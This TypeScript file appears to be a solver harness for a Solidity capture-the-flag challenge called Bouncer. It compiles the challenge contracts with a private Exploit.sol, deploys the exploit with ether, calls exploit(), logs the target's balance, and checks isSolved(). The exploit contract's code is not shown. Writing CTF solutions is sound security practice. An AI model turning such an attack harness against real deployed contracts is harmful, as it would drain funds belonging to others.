import { SolCompiler } from '../../../lib/compiler';
import { Sender } from '../../../lib/sender';
import setting from '../setting.json';

const abi = require('ethereumjs-abi');

const input = (findFileContent: any): any => {
    return {
        language: 'Solidity',
        sources: {
            //  public/<FILE_NAME>.sol
            'public/Setup.sol': {
                content: findFileContent('public/Setup.sol')
            },
            'public/Bouncer.sol': {
                content: findFileContent('public/Bouncer.sol')
            },

            //  private/<FILE_NAME>.sol
            'private/Exploit.sol': {
                content: findFileContent('private/Exploit.sol')
            },
        },
        settings: {
            outputSelection: {
                '*': {
                    '*': ['*']
                }
            }
        }
    }
}

/**
 * 
 * @param exploiter 
 * @param setupAddress 
 * @returns true if solved, false otherwise.
 */
export const solve = async (exploiter: Sender, setupAddress: string): Promise<boolean> => {
    const compiler = new SolCompiler(setting.solc.version, setting.problem.name);
    const {success, output} = await compiler.compile(input);
    if(!success){
        console.log('fail compilation');
        return false;
    }
    const bytecode = output['contracts']['private/Exploit.sol']['Exploit'].evm.bytecode.object;
    const exploitContractAddress = 
        await exploiter.deployContract(bytecode+'000000000000000000000000'+setupAddress.slice(2), {
            value: '100',
            unit: 'ether'
        });
    console.log('private/Exploit.sol', exploitContractAddress);

    {
        const balance = await exploiter.viewContract(exploitContractAddress, abi.simpleEncode('viewBouncerBalance()'));
        console.log('view bouncer balance:', balance);
    }

    const calldata = abi.simpleEncode('exploit()');
    const receipt = await exploiter.callContract(exploitContractAddress, calldata, {value: '50', unit: 'ether'});
    console.log('call exploit() receipt:', receipt);
    
    {
        const balance = await exploiter.viewContract(exploitContractAddress, abi.simpleEncode('viewBouncerBalance()'));
        console.log('view bouncer balance:', balance);
    }
    const balance = await exploiter.viewContract(exploitContractAddress, abi.simpleEncode('viewBalance()'));
    console.log('view balance:', balance);

    const data = abi.simpleEncode('isSolved()');
    const res = await exploiter.viewContract(setupAddress, data)
    return res === '0x0000000000000000000000000000000000000000000000000000000000000001';
}